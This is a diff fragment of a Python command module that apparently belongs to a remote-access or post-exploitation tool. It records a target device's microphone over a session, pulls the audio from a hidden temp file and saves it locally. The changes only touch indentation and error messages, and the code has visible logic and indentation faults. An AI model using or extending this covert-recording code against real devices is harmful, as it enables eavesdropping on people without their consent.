@@ -41,13 +41,13 @@ class command:
             	    return
 		
         if cmd_data['args'] == "stop":
-		    dest = cmd_data['args'][1]
+	    dest = cmd_data['args'][1]
             if os.path.isdir(dest):
                 if os.path.exists(dest):
-			        h.info_general("Recording mic...")
+		    h.info_general("Recording mic...")
                     result = json.loads(session.send_command(cmd_data))
                     if 'error' in result:
-                        h.info_error("Error: " + result['error'] + "!")
+                        h.info_error("Failed to record mic!")
                     elif 'status' in result and result['status'] == 1:
                         data = session.download_file("/tmp/.avatmp")
                         f = open(os.path.join(dest,'mic.caf'),'w')
@@ -71,7 +71,7 @@ class command:
                         rp = os.path.split(dest)[1]
                         result = json.loads(session.send_command(cmd_data))
                         if 'error' in result:
-                            h.info_error("Error: " + result['error'] + "!")
+                            h.info_error("Failed to record mic!")
                         elif 'status' in result and result['status'] == 1:
                             data = session.download_file("/tmp/.avatmp")
                             f = open(os.path.join(pr,rp),'w')
